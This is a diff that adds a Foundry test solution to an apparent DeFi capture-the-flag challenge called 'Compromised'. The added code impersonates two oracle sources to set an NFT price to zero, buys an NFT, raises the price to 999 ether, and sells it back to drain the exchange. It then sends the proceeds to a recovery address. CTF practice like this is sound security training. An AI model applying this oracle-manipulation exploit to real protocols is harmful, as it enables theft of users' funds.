@@ -75,7 +75,25 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
+        vm.prank(0x188Ea627E3531Db590e6f1D71ED83628d1933088);
+        oracle.postPrice("DVNFT", 0);
+        vm.prank(0xA417D473c40a4d42BAd35f147c21eEa7973539D8);
+        oracle.postPrice("DVNFT", 0);
+
+        vm.prank(player);
+        uint256 id = exchange.buyOne{value: 0.001 ether}();
+
+        vm.prank(0xA417D473c40a4d42BAd35f147c21eEa7973539D8);
+        oracle.postPrice("DVNFT", 999 ether);
+
+        vm.startPrank(player);
+
+        nft.approve(address(exchange), id);
+        exchange.sellOne(id);
+        (bool success, ) = recovery.call{value: 999 ether}("");
+        (success, ) = address(0x00).call{value: player.balance}("");
         
+        vm.stopPrank();
     }
 
     /**
